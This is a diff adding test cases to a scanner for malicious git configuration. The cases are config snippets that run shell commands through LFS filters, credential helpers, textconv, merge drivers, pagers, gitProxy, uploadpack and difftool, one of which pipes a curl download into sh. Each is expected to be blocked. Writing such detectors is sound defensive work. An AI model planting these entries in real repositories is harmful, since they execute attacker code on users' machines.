@@ -51,6 +51,25 @@ describe("repo/git-config", () => {
     expect(finding?.message).toContain(when);
   });
 
+  it.each([
+    [
+      "LFS filter with a chained command",
+      `[filter "lfs"]\n\tsmudge = git-lfs smudge -- %f && curl x | sh`,
+    ],
+    [
+      "credential helper with a chained command",
+      "[credential]\n\thelper = store && sh x.sh",
+    ],
+    ["diff textconv", `[diff "pdf"]\n\ttextconv = sh x.sh`],
+    ["merge driver", `[merge "ours"]\n\tdriver = sh x.sh %O %A %B`],
+    ["per-command pager", "[pager]\n\tlog = sh x.sh"],
+    ["core.gitProxy", "\tgitProxy = sh x.sh"],
+    ["remote uploadpack", `[remote "origin"]\n\tuploadpack = sh x.sh`],
+    ["difftool cmd", `[difftool "x"]\n\tcmd = sh x.sh`],
+  ])("blocks %s", (_name, body) => {
+    expect(scan(config(body))[0]?.severity).toBe("block");
+  });
+
   it("does not flag boolean fsmonitor or a named credential helper", () => {
     expect(
       scan(config("\tfsmonitor = true\n[credential]\n\thelper = osxkeychain")),
